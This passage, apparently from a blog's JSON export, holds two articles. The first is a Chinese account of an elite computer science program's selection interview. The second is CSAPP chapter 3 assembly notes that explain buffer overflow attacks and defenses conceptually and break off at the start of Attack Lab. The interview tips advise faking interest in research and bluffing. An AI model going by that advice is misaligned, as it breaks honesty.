wa，只过了几个点。\n\n出考场后感觉可能还要待在原专业了，不过感觉第一题又考前缀和又考二分，第二题甚至要用差分约束，应该得分都不多。\n\n结果回去看 acm 的交流群，一堆人说自己都过了两个题，有的人甚至直接做过 Leetcode 原题，甚至还有 ak 的，感觉这下可能面试都进不了了。（事后得知这三道题只需要按照题意写暴力算法就可以通过，没有对算法的考察）\n\n## 面试\n\n过了两周，出了面试名单，发现竟然进了面试，但是排名很难看。三道高数题应该是全对的，后面三道编程题只做出来一题，剩下两道题目拿了几个点的部分分，排名32/40。并且得知高数题全对+一道题+其他题0分无法进入面试，高数题全对+两题进不了前20。大概有 6 人机考是完全满分的。这就意味着今年竞争非常激烈，也这意味着我想要入选需要面试比别人高30多分。\n\n于是准备材料：\n\n- 第36次CCF CSP 430分成绩单\n- NOIP2023一等奖，CSP-S2023一等奖，NOI春季测试二等奖证书（反正有的证书全带了）\n- Codeforces rating 1601 的截图（当时听说湖大某些老师的实验室对研究生的 cf 分数有要求，于是就带了个）\n- CCPC2024郑州站优胜奖证书复印件（10 月份认识了两个拔尖班的学长，并且被两个学长带去打了 ACM。理论上打铁了不应该带的，但毕竟有证书，关键的是上面指导教师写着吴昊老师，而且其他两位学长都是拔尖班的，可能有buff）\n\n面试前跟已经面试完的人打听了一下：\n\n有个机考排名第一的，直接问他 CSP 考了多少分（这个大佬也和我一块考 CSP 了，拿到了 470 分），问了拿过什么奖项（这个大佬 NOI 铜牌，APIO 银牌），然后问他未来的方向，可不可能读研等。出来之后有个老师跟他说，不录他就没人录了。\n\n还有个排名也比较靠前的，先问了他有没有编程实践经历，他回答说是打过竞赛（这个大佬是江苏省一），然后问他已经在计科了，为什么要来计拔，问他认为计科和计拔有什么区别，随后又问了有没有关注前沿科学（因为他之前提到了进计拔可以接触前沿的领域），然后依然是问了想干什么，以及未来的规划，还问了明明知道 AI 可能取代程序员，为什么还想往这个方向走（因为他提到说自己考虑搞算法研究）。他指出 AI 取代的是码农，老师又反问“你觉得你说的那些前沿的算法，和那些可以被 AI 取代的有什么区别”，他直接无语。中间问了他一个问题，他回答说是比较关心国际局势，然后老师问他如何分析俄乌战争，然后他乱答了一堆，时候自己也忘了说了什么。\n\n还有个机考排名没有进前 20 的，自我介绍之后直接被问为什么机考第一题没做出来，已经在计科了为什么还要考拔尖班，他列举出各种优势之后被反问普通班不也一样，说一个优势就被否定一个。随后问了个智力问题：一根木棍，分成三段，能组成一个三角形的概率（后来我搜索发现好像是字节跳动的面试题目）。他自我介绍提到喜欢运动，然后被问什么运动，跑步的配速是多少。交奖项的时候，由于他参加了两年的 OI，所以提交了 4 份证书，被问怎么参加了这么多信息学竞赛。还问为什么物理竞赛不拿个省一，他回答说拿不到。\n\n后面又问了一些人，问什么的都有，比如让给出机考题目的其他做法，问本科生研究生博士生用英语怎么说。\n\n之前有问上一届的学长拔尖班面试问了什么。一个学长说是自我介绍完了就问期中哪科考的最差，然后就围绕最差的这一科反复拷打。还有人被问到一些奇怪问题，如：用十块钱你能干什么，怎么去搜索一个东西。\n\n然后就到了正式面试环节。面试时首先进行英文自我介绍，当时我准备的内容是：\n\n![](http://pic.caiwen.work/i/2025/07/28/688758c93bc22.png)\n\n由于我非常需要面试拿到高分，于是自我介绍尽可能展现硬实力而没有其他乱七八糟的（后面意识到我的自我介绍老师好像都没认真听）\n\n然后是提问环节\n\nQ：你有没有一些编程实践经历（看起来没听我自我介绍）\n\nA：我在高考后的暑假给我所在的高中编写了一个在线评测系统，我个人认为完成度还可以（我高考完之后的暑假学了一些 Springboot 全栈开发）\n\nQ：你能给我们展示一下吗\n\nA：可以，我已经部署了，网址是 oi.caiwen.work（目前已废弃）\n（旁边有个人试图把网址打上去，然后另一个老师把笔记本电脑给我让我自己打）\n\nA：这个主要是给校内使用的，所以需要登录才能看\n\nQ：你有账号吧，那你登录一下\n\n（登录好了，给他们看）\n\n（轮流拿电脑看，老师们都点点头）\n\nQ：这个都是你自己一个人写的吗\n\nA：对\n\nQ：（忘了具体问的什么了，大概是问有没有使用什么框架？）\n\nA：我们知道软件开发最忌讳的是重复造轮子，所以我使用了像 springboot 这样的框架\n\nQ：你们高中现在都在用你这个？\n\nA：只用了几次，因为我们高中的学生目前还处于初学阶段，像洛谷这样的网站会更适合\n\nQ：你是哪个高中\n\nA：沧州市第一中学\n\n（此时开始传阅提交的材料）\n\n（看到CSP 430分都很震惊，中间的教授小声说了句“牛逼啊”）\n\nQ：你这个CSP是什么时候考的\n\nA：这个月初\n\nQ：这个 Caiwen 是谁（Codeforces 截图的昵称是这个）\n\nA：这是 cf 的昵称，cf的分数可以反应一定的实力\n\nQ：你这个大学生程序设计竞赛的指导教师是谁\n\nA：吴昊老师\n\nQ：所以你现在是在学校的ACM校队吗\n\nA：可以算是\n\nQ：我们比较感兴趣的是你的 CSP 分数，你的 CSP 分数和你的机考成绩非常不符啊\n\nA：可以说我机考发挥的很不好，主要是因为错解了题意，有一个分奖励的题目，大概意思相邻两个人，分数高的要分到更多的奖励，分数低的要分到更少的奖励。但是两个人分数相同的话怎么分？题目没有说这一点，样例也没有提示，我默认两个分数相同的人需要分到相同的奖励。于是这道题目无论如何也无法通过，导致用掉了很长时间，最后一题也没时间想了\n\nQ：那你这种情况就很遗憾了\n\nQ：你有选高数A吗（可能看到我原专业是城乡规划的，这个专业不学高数A）\n\nA：选了\n\nQ：你也知道我们计拔的竞争难度很大，如果你没有被选上的话，那么下学期还会转到我们学院吗\n\nA：会（同时感觉这个问题非常危险）\n\nQ：问你个问题，表盘上有时针分针秒针三个指针，问你时针在表盘上转过一周，三个指针重合了多少次\n\n（想了一会，太紧张没什么思路）\n\nQ：你不用给出答案，说大概思路就可以\n\n（提问的老师在笑，旁边老教授在拿笔打分，更紧张了）\n\nA：我觉得可以设时分秒三个未知数，然后列方程应该能解出来吧\n\nQ：如果让你用计算机做的话你会怎么做\n\nA：开三个for循环枚举时分秒然后判断一下\n\nQ：好（看起来对答案不是太满意）\n\nQ：（另一个老师）你高数期中考了多少\n\nA：满分\n\nQ：线代呢\n\nA：我们这学期没有线代\n\nQ：你未来有什么规划\n\nA：我想的是先学习一些比较基础的知识，如操作系统，计算机网络，编译原理这些，然后再看自己对哪个方向感兴趣，继续深入学习\n\nQ：然后呢，去找工作吗？\n\nA：我还是偏向于科研一些\n\nQ：你认为什么是科研\n\nA：大概是解决一些问题\n\n旁边老师：时间到了。于是面试结束\n\n面试之后我有一些经验：\n\n总的来说一定会问的问题是对未来有什么打算。对于已经是计科专业的会问怎么认识拔尖班，和普通班有什么区别。对于机考排名较低的，还会问一个智力题。剩余的问题往往从你之前的回答中进行提问（可能需要考虑回答的时候不给自己挖坑）。\n\n他大概率不听你英文自我介绍（也可能我口语不行），然后也不看你报名表上的基本信息。\n\ncf成绩截图没必要带了，看来老师们不太懂这个。\n\nccf csp>noip，老师不太清楚noip省一是比csp 400+难度大的。\n\n考虑到这个拔尖班就是想让你做科研的，所以你面试的时候应该要体现你想做科研（即使你对科研根本不感兴趣）提想找工作应该是大忌。虽然大一刚来应该也不晓得什么是科研，但你也要会瞎说，比如讲自己对什么人工智能感兴趣，对算法研究感兴趣之类的（即使你可能对这些没啥了解），然后再事先了解一下，在面试的时候装模作样地讲，基本就妥了。\n\n面试你的教授都是搞科研的，而且据我了解，湖大的信科院非常瞧不起搞软件的，所以如果你之前做过简单的web开发之类，且没什么亮点的话，就不要在面试上去讲了（你面前的教授也未必懂开发）。\n\n机考的因素最大，我们这次只有一个机考20名的被筛下去。基本你机考排名高的话就随便聊天就过了。排名低的话要注意后面有没有绝活哥把你名额掠夺了。\n\n## 结束\n\n又过了大概两周的时间，计拔出结果了，没有从入选名单上看到自己的名字，非常遗憾。后续在 ACM 新生杯上取得了第三名，感觉新生杯比赛题目和计拔换一下就好了。有人统计出了计拔排名和新生杯排名的对比：\n\n![](http://pic.caiwen.work/i/2025/07/24/688255fb6bea8.png)\n\n左边是计拔排名，右边是新生杯的排名（新生杯从第 32 名开始就只通过了一题），当时很不服气计拔的选拔题目，我同时也不认为自己一定就比前 20 个入选的水平低。不过后续还是继续准备正常转专业了。\n\n后来从 ACM 教练那边得知我计拔最后排名是 21 名，就差一名。如果前面的人有挂科或者放弃的那么我就进了，前两年都有这种情况。这下感觉更遗憾了。\n\n后面比较巧，原来计拔排名第一的人高数挂了，最后还是卡线进了。\n\n---\n\n在进入计拔之后，发现这个计拔并没有想象的那么好。\n\n首先是文件上写的每年给 100万 的经费不知去向，至少作为学生是感受不到的。\n\n文件上所说的达到基本条件即可保研确实是真的，计拔 100% 保研（甚至挂了一科也能保研，但是挂了两科就会被踢出去了），并且不存在说末尾强制本校直博。但有个问题是，计拔的人数基数只有 20 人，而保外校往往看排名百分比，计拔的第一就是 5% 了，第二就是 10% 了，这对于保外校是很大的劣势，我的一个拔尖班学长跟我讲，他们的夏令营和预推免的形势非常严峻，去到好学校都是各凭本事，而拔尖班完全是个累赘。\n\n拔尖班的课程和普通班区别不大，水课该有的还是有，讲课的内容也和普通班一样，需要学的课时数也是一样的，甚至你把拔尖班的课退掉再去选普通班的课都没问题，甚至还更好得分。所谓的小班授课也没啥用，老师面对 20 人和面对 120 人的表现都是一样的，只是完成讲课的表演而已。\n\n其他方面，拔尖班并不会有任何资源倾斜，无论是竞赛还是科研还是什么别的。\n\n所以，所谓的拔尖计划只不过是组织了个考试，排名前 20 的人奖励了一个保研名额，作为代价，在其他方便有劣势。如果不是要转专业，或者打算搞个保研就摆大烂，留本校也不介意的那种，那就不要来了。回想面试时有人被问到”已经在计科了为什么还要考拔尖班“，我不知道这个老师想听到的答案是什么，或者说他这句话就是用来劝退的。\n\n","summary":"作者分享参加湖南大学计算机拔尖计划选拔经历，包括机试和面试细节。机试编程题因误 解题意失误，但最终仍意外入选。反思拔尖班实际优势有限，保研虽易但外校竞争劣势，课程无差别，资源无倾斜，建议谨慎选择。","key":["湖南大学","计算机","转专业","拔尖计划"],"tags":[],"path":["记录","湖南大学计算机拔尖计划游记.md"],"background":"http://pic.caiwen.work/i/2025/07/28/68875bddcd126.png","recommend":false,"status":"published"},{"type":"Article","title":"CSAPP第三章 - 程序的机器级表示","id":"csapp-3","createTime":"2025-07-19T09:53:00.000Z","updateTime":"2025-09-06T02:44:46.339Z","content":"\n## 数据格式\n\n- 字节，8位，汇编后缀为 `b`\n- 字（word）表示 16 位，2 字节，汇编后缀为 `w`\n- 双字（double words）表示 32 位，4 字节，汇编后缀为 `l`\n- 四字（quad words）表示 64 位，8 字节，汇编后缀为 `q`\n\n浮点数使用单独的指令集，和上述一般的数据有所不同\n\n- 单精度（float），32 位，4 字节，汇编后缀为 `s`\n- 双精度（double），64 位，8 字节，汇编后缀位 `l`\n\n## 寄存器\n\n![](http://pic.caiwen.work/i/2025/07/19/687b710866f7d.png)\n\n总的来说是 16 个寄存器，每个寄存器又分 4 个具体的寄存器，可以分别访问低 8、低 16、低 32、低 64 位的数据\n\n此外 CPU 中还有一些条件码寄存器，主要配合控制指令来使用。条件码寄存器只存储一个位：\n\n- `CF`：进位标志。对于整数操作，表示最近的操作的最高位是否产生了进位，可用来检查无符号操作的溢出。对于浮点运算，如果运算结果是负数，或是有一个操作数是 NaN 的话就设置为 1\n- `ZF`：零标志。对于整数操作，表示最近的操作结果是否为 0。对于浮点运算，如果运算结果为 0 或是有一个操作数是 NaN 的话就设置为 1\n- `SF`：符号标志，表示最近的操作结果是否为负数\n- `OF`：溢出标志，表示最近的操作是否导致一个补码发生了正溢出或者负溢出\n- `PF`：奇偶标志位。对于整数操作，如果最近的操作结果是偶校验的（即含有偶数个二进制 1），则设置为 1。对于浮点运算，如果有一个操作数是 NaN 的话就设置为 1\n\n一般情况下算数指令执行后就会设置条件码，但有如下的注意：\n\n- `leaq` 指令不设置条件码\n- `xor` 指令不设置 `CF` 和 `OF`\n- 所有的移位操作，`CF` 为最后一个被移出的位，`OF` 被设置为 0\n- `inc` 和 `dec` 只设置 `OF` 和 `ZF`，不设置 `CF`\n\n还有一些特殊的寄存器：\n\n- `%rip` 又称为 PC ，程序计数器，存放将要执行的下一条指令在内存中的地址\n\nAVX 浮点体系架构还提供如下的寄存器：\n\n![](http://pic.caiwen.work/i/2025/07/20/687c98eff3c66.png)\n\n这些寄存器主要用来存储向量，如每个 ymm 寄存器可以存放 8 个32 位值，或是 4 个64 位值，浮点数和整数都可以。不过如果单纯用来进行单个浮点数运算的话，只需要用到 xmm 寄存器的低 32 或 64 位\n\n## 操作数\n\n- 立即数，以 `$` 开头随后接一个 C 语言中可以表示的整数字面量，如 `$-577`、`$0x1F`\n- 寄存器，以 `%` 开头随后接寄存器的名称\n- 内存引用，完整的格式是 `Imm(rb,ri,s)`，表示的地址为 `Imm+rb+s*ri`，我们其中 `Imm` 是一个数字，`rb` 和 `ri` 是寄存器，`s` 是一个只能为 1 2 4 8 的数字。我们把 `rb` 称为基址寄存器，`Imm` 称为偏移，`ri` 称为变址寄存器，`s` 称为比例因子\n\n![](http://pic.caiwen.work/i/2025/07/19/687b731de5f78.png)\n\n## 指令\n\n### 数据传送指令\n\n源和目的的数据大小都一致情况：\n\n![](http://pic.caiwen.work/i/2025/07/19/687b74fb53189.png)\n\n有几个注意点：\n\n- 如果选用寄存器，寄存器的大小要和指令后缀相符合\n- x86-64 要求传送指令的两个操作数不能够都是访问内存\n- 使用 `movl` 传送完双字之后，该寄存器所对应的 64 位寄存器的高 4 字部分置 0\n- 使用 `movq` 的话，立即数只能是 32 位的，传送时是将 32 位立即数进行符号扩展再传过去\n- `movabsq` 则可以直接使用 64 位的立即数，但也只能使用立即数，并且传送目标只能是寄存器\n\n\n小数据传到大数据的传送指令有两种：一种进行零扩展一种进行符号扩展\n\n![](http://pic.caiwen.work/i/2025/07/19/687b786aa7e94.png)\n\n![](http://pic.caiwen.work/i/2025/07/19/687b7887550b2.png)\n\n- 上面不存在 `movzlq`，是因为 `movl` 在传送后自动清空高 4 字节，达到了 `movzlq` 的目的\n- `cltq` 无需指定操作数，他和 `movslq %eax,%rax` 一致，但是编码更加紧凑\n\nC 语言中，如果进行强制数据类型转换的时候既涉及大小变化又涉及符号变化时，应先改变大小。比如一个 `unsigned char` 转 `int` 的话，应该是零扩展到 32 位，而并非是符号扩展到 32 位\n\n### 算数指令\n\n#### 加载有效地址\n\n格式为 `leaq S,D`，这个指令的 `S` 部分必须是一个内存引用格式，其作用类似传送指令，把 `S` 表示的地址传送到 `D` 中。实际中这个指令和内存地址关系不大，只是单纯的计算数字，如：`leaq 7(%rdx,%rdx,4),%rax` 就相当于将 `%rax` 变为 `7+5%rax`\n\n#### 一元操作和二元操作\n\n![](http://pic.caiwen.work/i/2025/07/19/687b7b65856f0.png)\n\n![](http://pic.caiwen.work/i/2025/07/19/687b7b81a33ed.png)\n\n- 上面的所有指令都需要添加后缀，比如 `addq`\n\n- 同样地，操作数不能同时是内存\n- 对于不符合交换律的运算，如 `sub`，一定是后面的操作数在前\n\n#### 移位操作\n\n![](http://pic.caiwen.work/i/2025/07/19/687b7cd55dffa.png)\n\n其中 `k` 为移位量，`D` 表示要作用的目标\n\n- `k` 必须是一个立即数，或是单字节寄存器 `%cl` 中，其他寄存器不可以\n- 上述的指令同样需要添加后缀。只要求 `D` 作为寄存器时大小和后缀相符即可\n- 如果 `k` 使用 `%cl` 的话，如果 `D` 的位长为 $w$，那么位移量由 `%cl` 的低 $m$ 位决定，其中 $2^m=w$，高位部分会被忽略。比如 `%cl` 为 `0xFF` 的话，`salb` 会移动 7 位，`salw` 会移动 15 位，`sall` 会移动 31 位，`salq` 会移动 63 位\n\n#### 128 位运算\n\nIntel 把 16 字节的数称为八字（oct word）。为了表示 128 位的数据，我们规定 `%rdx` 存高 64 位，`%rax` 存低 64 位，然后我们有如下指令：\n\n![](http://pic.caiwen.work/i/2025/07/19/687b8164d6a18.png)\n\n- 注意 `mulq` 只有一个操作数，区别于上面有两个操作数的 `mulq`\n\n- `divq` 和 `idivq` 指令执行后会分别把除数和余数放到两个寄存器中\n- 实际上对于非 128 位的数据进行除法或者取模运算的话也需要使用 `idivq` 和 `divq` 指令。这些数据在进行 `div` 指令前需要先通过 `clto` 指令来把自身符号扩展到 128 位\n\n### 控制指令\n\n#### 仅设置条件码\n\n`cmp` 和 `test` 指令分别基于减法和按位与运算，但是只设置条件码\n\n![](http://pic.caiwen.work/i/2025/07/19/687b880699f9f.png)\n\n比较常见的是，`cmp` 指令用来判断两个数的大小，`test` 传递两个相同的操作数来判断这个数字的正负\n\n#### 访问条件码\n\n通常条件码寄存器不会被直接访问，而是通过如下的指令来访问\n\n![](http://pic.caiwen.work/i/2025/07/19/687b89c34e98a.png)\n\n- 其中注意 `l` 和 `b` 的后缀不再表示数据的大小了，而是 less 和 below 的意思\n- 无需增加后缀，会自动根据目标寄存器的大小推断\n\n- 操作数 `D` 必须是一个单字节寄存器\n\n#### 跳转\n\n![](http://pic.caiwen.work/i/2025/07/19/687b8b540261c.png)\n\nlabel 是汇编中的标号，如：\n\n```assembly\n\tmovq $0,%rax\n\tjmp .L1\n\tmovq (%rax),%rdx\n.L1\n\tpopq %rdx\n```\n\n`jmp` 还可以有间接跳转，即跳转目标的地址是从寄存器或者内存中读取的，如：`jmp *%rax` 和 `jmp *(%rax)`\n\n跳转指令要跳转到的地址在机器码层面一般有两种编码方式：一种是 PC 相对的，即目标编码为实际地址与当前 PC （当前 PC 是下一条指令的地址）的差值，或者说下一条指令的地址加上跳转指令的地址记为真实跳转到的目标地址；一种是绝对的，即直接写明要跳转到的地址\n\n跳转指令可以用来实现 C 语言的 if 语句，如：\n\n```c\nif (test-expr)\n\tthen-statement\nelse\n    else-statement\n```\n\n一般会被翻译成如下的汇编（用 C 的形式表示）\n\n```c\n\tt = test-expr\n    if (!t)\n        goto false;\n\tthen-statement\n    goto done;\nfalse:\n\telse-statement\ndone:\n```\n\n有意思的是汇编的测试条件和 C 的正好相反\n\n#### 条件传送\n\n上面的跳转可能会影响处理器性能，因为现代处理器是流水线化工作的，一条指令的执行被拆成了好几步，上一条指令还没执行完毕就同时执行下一条指令。如果程序是顺序结构的话，那么处理器在执行的时候会将指令填满流水线。而当遇到分支的时候，处理器无法得知后续要执行的指令，流水线则会空闲。处理器为了保持流水线充满，会对分支进行预测，预测后续执行的指令，但是如果预测失败，则需要很大的惩罚回退已经执行的操作。\n\n部分分支情况可以使用条件传送进行优化。这种优化会把两个分支都进行计算，然后在最后根据条件选择要选用的值：\n\n![](http://pic.caiwen.work/i/2025/07/20/687c37e41d29b.png)\n\n只有满足相应的条件，才会进行传送\n\n- `S` 只能是寄存器或者内存，`R` 只能为寄存器\n- 不支持单个字节的传送\n- 无需增加后缀，会自动根据目标寄存器的大小推断\n\nC 语言中使用三目表达式可能会更容易让编译器使用条件传送指令\n\n有些情况下，有可能把两个分支的值都计算完毕之后比分支预测失败带来的惩罚还高，那么编译器就不会选用条件传送\n\n如果分支并非单纯的计算值，而是可能有副作用，那么也不会选择条件传送\n\n如：\n\n![](http://pic.caiwen.work/i/2025/07/20/687c3ef194cf0.png)\n\n看起来可以用条件传送，但是如果 `xp` 真的为空指针的话，提前计算 `*xp` 会导致空指针异常\n\n### 浮点相关\n\n#### 浮点传送\n\n![](http://pic.caiwen.work/i/2025/07/20/687c9ae817dbe.png)\n\n其中 `X` 只能选择 XMM 寄存器，`M` 只能选择内存\n\n如果浮点运算涉及到了立即数，那么需要由编译器先把立即数写到 rodata 段，然后从内存引用\n\n#### 转换操作\n\n**浮点转整数**\n\n![](http://pic.caiwen.work/i/2025/07/20/687c9c0c23a8f.png)\n\n截断会向 0 舍入\n\n**整数转浮点**\n\n![](http://pic.caiwen.work/i/2025/07/20/687c9c575c7d9.png)\n\n一般源 2 和目的一致\n\n**单精度到双精度**\n\n如果想把单精度数据转成双精度数据的话，可以使用 `vcvtss2sd` 指令，如 `vcvtss2sd %xmm0,%xmm0,%xmm0` 即可把 `%xmm0` 的单精度变为双精度\n\n不过 GCC 生成如下的代码\n\n```assembly\nvunpcklps %xmm0,%xmm0,%xmm0\nvcvtps2pd %xmm0,%xmm0\n```\n\n`vunpcklps` 将两个 xmm 寄存器的值交叉放置，然后把结果放到第三个寄存器。比如第一个寄存器的内容为字 `[s3,s2,s1,s0]`，另一个寄存器的内容为字 `[d3,d2.d1,d0]` ，那么目标寄存器的值会变为 `[s1,d1,s0,d0]`。那么对于上面这个指令，如果 `%xmm0` 的值为字 `[x3,x2,x1,x0]` 的话那么 `%xmm0` 会变为 `[x1,x1,x0,x0]`。\n\n`vcvtps2pd` 会将源寄存器的两个低位的单精度值扩展成 xmm 寄存器中的两个双精度值。对于上面这个例子，最终 `%xmm0` 变为 `[dx0,dx0]`\n\n那么上述两个指令合起来的效果就是把 `%xmm0` 低 32 位表示的单精度浮点数转为两个一样的双精度\n\n这样做不会有什么好处，GCC 这么做的原因也不明\n\n**双精度到单精度**\n\n可以使用 `vcvtsd2ss %xmm0,%xmm0,%xmm0` 指令，但是 GCC 产生如下的代码：\n\n```assembly\nvmovddup %xmm0,%xmm0\nvcvtpd2psx %xmm0,%xmm0\n```\n\n`vmovddup` 会将 xmm 的低 64 位复制到高 64 位，于是如果 `%xmm0` 为 `[x1,x0]` 的话会变成 `[x0,x0]`，`vcvtpd2psx` 会将 xmm 的两个双精度数字变为两个单精度，并在高 64 位填充 0，即会变为 `[0.0,0.0,x0,x0]`\n\n#### 浮点运算\n\n![](http://pic.caiwen.work/i/2025/07/20/687ca0c0812c3.png)\n\n- 第一个操作数 `S1` 必须是 xmm 寄存器或者是内存\n- 第二个操作数和目的都必须是 xmm 寄存器\n\n![](http://pic.caiwen.work/i/2025/07/20/687ca1d00c8ec.png)\n\n- 源和目的都必须是 xmm 寄存器\n\n#### 比较操作\n\n![](http://pic.caiwen.work/i/2025/07/20/687ca3cc6ca6c.png)\n\n浮点运算主要会设置 `ZF`、`CF` 和 `PF`，设置条件如下：\n\n![](http://pic.caiwen.work/i/2025/07/20/687ca3a7495c8.png)\n\n## 函数调用\n\n### 压栈弹栈指令\n\n`%rsp` 寄存器存放当前栈顶地址\n\n![](http://pic.caiwen.work/i/2025/07/20/687c40e130320.png)\n\n### 调用返回指令\n\n![](http://pic.caiwen.work/i/2025/07/20/687c412f3cc58.png)\n\n其中 `call` 指令会首先把当前 PC （即下一条指令的地址）压入栈中，用来后续返回，然后将 PC 置为要调用的函数的地址\n\n`ret` 指令会从栈中弹出一个值（编译器需要确保执行 `ret` 时已经弹栈到返回地址处了），然后将 PC 置为这个值\n\n### 参数和返回值\n\n返回值放在 `%rax` 寄存器中，如果返回值是浮点数，则会放在 `%xmm0`\n\n传递参数时，前 6 个参数通过寄存器传递，使用寄存器的规则如下：\n\n![](http://pic.caiwen.work/i/2025/07/20/687c42ea0d6dc.png)\n\n多余 6 个的参数会直接压入栈中\n\n对于浮点数参数，前 8 个浮点数参数会使用 `%xmm0` 到 `%xmm7` 传递，剩余的会压入栈中\n\n压入栈中的时候，无论是 8 位 16 位还是 32 位，都占用 64 位的栈空间\n\n![](http://pic.caiwen.work/i/2025/07/20/687c44d1c6d0a.png)\n\n注意第七个函数位置是 `%rsp+8`，因为 `%rsp` 的位置上是 `call` 指令压入的返回值地址\n\n### 寄存器\n\n为了确保调用一个函数前后，被调用的函数不会覆盖调用函数稍后会使用的寄存器值，我们需要有一个约定。一些寄存器是需要调用者进行提前保存的，一些寄存器是需要被调用者保存的。\n\n我们假设现在是函数 A 调用了函数 B\n\n`%rbx`、`%rbp`、`%r12` ~ `%r15` 被划分为被调用者保存寄存器。函数 B 需要确保自己执行前后这些寄存器的值不变。函数 B 要么根本不去动这些寄存器，要么先把这些寄存器的值压入栈中，返回时再恢复。这样，函数 A 可以在调用 B 前放心地把数据存到这些寄存器上\n\n上述以外的寄存器（`%rsp` 除外）被划分为调用者保存寄存器，包括 ymm 和 xmm 这些寄存器。任何函数都可以随意使用这些寄存器，如果函数 A 需要确保这些寄存器在调用函数 B 后不变的话，需要自行保存\n\n## 数据结构\n\n### 跳表\n\n对于 switch 语句，如果判断的情况比较少的时候可能会直接展开成 if 语句，如果判断的情况比较多，且判断的值范围跨度比较小的时候，就会使用跳表\n\n比如：\n\n![](http://pic.caiwen.work/i/2025/07/20/687c3c7d4548b.png)\n\n会编译成：\n\n![](http://pic.caiwen.work/i/2025/07/20/687c3caedd6c2.png)\n\n其中，L4 是位于 rodata 段的数据：\n\n![](http://pic.caiwen.work/i/2025/07/20/687c3d5f2cdd5.png)\n\n换成 C 语言代码就是：\n\n![](http://pic.caiwen.work/i/2025/07/20/687c3cf84d3f0.png)\n\n其中 `&&` 表示获取某个代码位置的地址\n\n大概就是把 switch 判断的值映射到一个比较小的值上面，然后以映射后的值作为下标直接从数组中获取跳转地址。这种带来的好处就是无论需要判断的情况有多少，执行 switch 指令的时间都是一样的\n\n### 多维数组\n\n多维数组在内存中的排列规则是，最后一个下标的元素连续，比如：\n\n![](http://pic.caiwen.work/i/2025/07/20/687c4b6086eeb.png)\n\n### 变长数组\n\nISO C99 引入了变长数组这一特性，允许声明数组时数组长度为变量\n\n数组长度无法在编译期获知的话，可能会使得函数在返回时不好清理当前栈帧。为了管理变长栈帧，x86-64 使用 `%rbp` 这个寄存器存储当前的栈顶地址。由于 `%rbp` 是被调用者保存寄存器，需要先压入栈中。比如：\n\n![](http://pic.caiwen.work/i/2025/07/20/687c91c86b404.png)\n\n对应汇编：\n\n![](http://pic.caiwen.work/i/2025/07/20/687c920762852.png)\n\n运行时栈上的情况为：\n\n![](http://pic.caiwen.work/i/2025/07/20/687c923555b3d.png)\n\n当函数返回之前，会执行一个 `leave` 指令，该指令不需要操作数，等价于下面两条指令：\n\n```assembly\nmovq %rbp,%rsp\npopq %rbp\n```\n\n即会直接把 `%rsp` 置为栈顶来清栈，然后恢复 `%rbp`\n\n### 结构体\n\n结构体可能包含多种数据类型。为了提高内存读写效率，数据之间需要进行对齐。对齐原则是任何 $K$ 字节的基本对象的地址必须是 $K$ 的倍数\n\n比如：\n\n- `struct P1 {int i;char c;int j;char d;};`\n\n| 偏移 | 0        | 4                | 8        | 12               | 16  | 对齐 |\n| ---- | -------- | ---------------- | -------- | ---------------- | --- | ---- |\n| 内容 | `int i;` | `char c;` + 填充 | `int j;` | `char d;` + 填充 |     | 4    |\n\n注意最后大小不是 9，`d` 后面还有 3 字节的填充。这么做是因为我们希望做到 `P1` 类型后面再跟一个 `P1` 类型的话，后面 `P1` 类型的第一个成员也满足对齐\n\n- `struct P2 {int i;char c;char d;long j;};`\n\n| 偏移 | 0        | 4         | 5                | 8         | 16  | 对齐 |\n| ---- | -------- | --------- | ---------------- | --------- | --- | ---- |\n| 内容 | `int i;` | `char c;` | `char d;` + 填充 | `long j;` |     | 8    |\n\n- `struct P3 {short w[3];char c[3];};`\n\n| 偏移 | 0             | 6                   | 10  | 对齐 |\n| ---- | ------------- | ------------------- | --- | ---- |\n| 内容 | `short w[3];` | `char c[3];` + 填充 |     | 2    |\n\n这个例子最后的填充说明，数组需要对齐的倍数为数组元素的大小而并非整个数组的大小\n\n- `struct P4 {short w[5];char *c[3];};`\n\n| 偏移 | 0                    | 16           | 40  | 对齐 |\n| ---- | -------------------- | ------------ | --- | ---- |\n| 内容 | `short w[5];` + 填充 | `char c[3];` |     | 8    |\n\n- `struct P5 {struct P3 a[2];struct P2 t;};`\n\n| 偏移 | 0                        | 24             | 40  | 对齐 |\n| ---- | ------------------------ | -------------- | --- | ---- |\n| 内容 | `struct P3 a[2];` + 填充 | `struct P2 t;` |     | 8    |\n\n对于结构体，我们需要把结构体作为一个大的类型看。结构体的对齐并非是结构体的大小了，而是结构体成员中的对齐的最大值。结构体作为成员时，起始地址应该是其对齐的倍数。这么做的原因是，1 2 4 8 这四个数，后面的数字都是前面的数字的倍数，比如按 8 对齐之后自然满足按 2 对齐，但是按 2 对齐后未必能是按 8 对齐的，所以我们要取对齐的最大值\n\n## 对抗缓冲区溢出\n\n### 栈随机化\n\n如果要进行缓冲区攻击，那么就需要把恶意代码放到缓冲区中，同时我们还需要得知插入代码的地址。因此一个防范手段是，程序开始时就在栈上分配一段随机大小的空间，这样就相当于把栈的起始地址随机了，这样一来攻击者将很难得知插入的代码位于哪里\n\n一个解决手段是，将恶意代码前面加入若干 `nop` 指令，这种指令只会增加 PC 而不会有其他行为。这样，攻击者只需要猜对有 `nop` 指令的范围就可以了，跳到 `nop` 范围后程序将会沿着 `nop` 一直滑向恶意代码，对应的专业术语叫空操作雪橇（nop sled）\n\n### 栈破坏检测\n\nGCC 会评估一个函数是否容易受到缓冲区攻击，并在缓冲区的上方防止一个特殊的数据，被称为金丝雀。在执行 `ret` 指令之前，GCC 会生成检查代码，检查这个金丝雀是否发生改变。如果改变的话说明缓冲区被攻击，会立刻终止程序\n\n![](http://pic.caiwen.work/i/2025/07/20/687c62481a095.png)\n\n![](http://pic.caiwen.work/i/2025/07/20/687c625b0a060.png)\n\n其中第 3 行获取金丝雀数据，第 13 行进行金丝雀检查\n\n编译时使用 `-fno-stack-protector` 参数可以禁止 GCC 进行栈破坏检测\n\n### 限制可执行代码区域\n\n可以在分页的时候限制执行权限\n\n## 命令行工具\n\n产生汇编代码：`gcc -Og -S mstore.c`，其中 `-Og` 会使得编译器尽可能保持代码的整体结构，`-S` 说明生成汇编代码\n\n产生机器代码：`gcc -Og -c mstore.c`，`-c` 表示产生二进制的机器代码\n\n反汇编：`objdump -d mstore.o` 可以把上面产生的二进制机器码反汇编\n\n## Bomb Lab\n\n写了几天的实验过程突然丢失了，等大二下学期正式学 CS 的时候再补（）\n\n## Attack Lab\n\n### Phase 1\n\n我们需要进行一个缓冲区攻击，使得 getbuf 函数返回值直接跳到 touch1 